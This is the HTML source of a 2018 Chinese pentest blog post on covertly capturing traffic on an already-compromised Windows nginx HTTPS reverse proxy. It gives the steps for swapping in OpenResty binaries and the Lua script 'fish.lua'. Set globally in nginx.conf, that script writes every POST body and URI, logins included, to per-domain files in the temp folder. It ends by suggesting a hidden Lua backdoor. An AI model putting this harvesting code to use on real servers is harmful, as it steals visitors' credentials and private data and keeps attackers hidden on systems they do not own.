@@ -1,0 +1,323 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>如何截取openresty反向代理服务器数据包 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。
+攻击背景
+获取https反向代理服务器的数据请求数据 
+Windows平台
+
+攻击流程下载openresty和nginx的windows版本，先本地测试一下。
+如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。
+把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe。
+把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty，可以修改openresty源代码。
+截取POST数据包根据P神的文章里面:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="如何截取openresty反向代理服务器数据包"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 如何截取openresty反向代理服务器数据包</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。</p>
+<h3 id="攻击背景"><a href="#攻击背景" class="headerlink" title="攻击背景"></a>攻击背景</h3><ul>
+<li>获取https反向代理服务器的数据请求数据 </li>
+<li>Windows平台</li>
+</ul>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>下载openresty和nginx的windows版本，先本地测试一下。</p>
+<p>如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。</p>
+<p>把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe。</p>
+<p>把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty，可以修改openresty源代码。</p>
+<h3 id="截取POST数据包"><a href="#截取POST数据包" class="headerlink" title="截取POST数据包"></a>截取POST数据包</h3><p>根据P神的文章里面:</p>
+<p><code>access_by_lua_file /usr/local/openresty/luasrc/fish.lua;</code></p>
+<p>这个配置是http请求之前执行的，所以修改下这个lua文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">local method&#x3D;ngx.req.get_method()
+local fd &#x3D; io.open(&quot;C:\\windows\\temp\\&quot;..ngx.var.host..&quot;.txt&quot;,&quot;ab&quot;)
+ngx.req.read_body()
+local data&#x3D;ngx.req.get_body_data()
+local uri &#x3D; ngx.var.request_uri
+if fd &#x3D;&#x3D; nil then return end
+if method &#x3D;&#x3D; &quot;POST&quot; then
+    if data &#x3D;&#x3D; nil then return end
+    fd:write(uri..&quot;[*]&quot;..data..&quot;\n&quot;)
+    fd:close()
+end
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>代码保存为fish.lua，然后放到nginx里面conf目录下，修改nginx.conf：</p>
+<p><code>access_by_lua_file conf/fish.lua;</code></p>
+<p>把上面这一行放到nginx配置的server模块外面那一层，相当于全局过滤，因为目标服务器反向代理了n个站。</p>
+<p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html">https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://wooyun.jozxing.cc/static/drops/tips-6403.html">http://wooyun.jozxing.cc/static/drops/tips-6403.html</a></li>
+</ul>
+<p>坑点：</p>
+<ul>
+<li><p>由于是直接在目标服务器操作的，中间把站点给down了n+n次，修改lua文件n次，主要依靠error.log来修改fish.lua，中间要判断data不为nil，参考上面文章。</p>
+</li>
+<li><p>openresty启动指定配置文件要绝对路径。</p>
+</li>
+<li><p>如果lua在执行过程中出错（比如我碰到的data数据为空，虽然反代正常工作，但是用户登录就出错），服务器会报500，所以<strong>绝对</strong>保证lua文件不能出错。</p>
+</li>
+</ul>
+<p>最后达到什么效果： 截取所有的post数据和uri，根据域名放到不通的txt文件里面。 </p>
+<p>没图说个蛋蛋：</p>
+<p><img src="https://i.loli.net/2017/07/25/5977478193da9.png"></p>
+<p><img src="https://i.loli.net/2017/07/25/597748509b5b3.png"></p>
+<h3 id="课后思考："><a href="#课后思考：" class="headerlink" title="课后思考："></a>课后思考：</h3><p>最后一个：如果某天撸了openresty的服务器，肿么感觉可以在配置里面留下一个lua的后门哩？</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2018/03/02/openresty-https.html" class="leancloud-visitors view" data-flag-title="如何截取openresty反向代理服务器数据包">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2018/06/05/local-network-pentest.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2018/02/03/termite-socks.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2018-03-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E8%83%8C%E6%99%AF"><span class="toc-article-text">攻击背景</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-article-text">攻击流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%88%AA%E5%8F%96POST%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-article-text">截取POST数据包</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AF%BE%E5%90%8E%E6%80%9D%E8%80%83%EF%BC%9A"><span class="toc-article-text">课后思考：</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
